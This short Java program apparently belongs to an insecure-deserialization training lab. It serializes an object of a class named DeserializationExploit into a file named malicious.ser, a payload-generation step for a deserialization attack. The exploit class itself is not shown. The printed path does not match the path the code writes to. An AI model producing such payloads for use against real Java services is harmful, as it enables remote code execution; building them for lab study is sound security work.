import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;
class serializationClass {
    public static void main(String[] args) {
        DeserializationExploit e=new DeserializationExploit();
        try {
        FileOutputStream fileOut =
        new FileOutputStream("GeneralJava/08-InsecureDeserialization/main/src/malicious.ser");
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        out.writeObject(e);
        out.close();
        fileOut.close();
        System.out.printf("Serialized data is saved in /tmp/malicious.ser");
        } catch (IOException i) {
        i.printStackTrace();
        }    }
}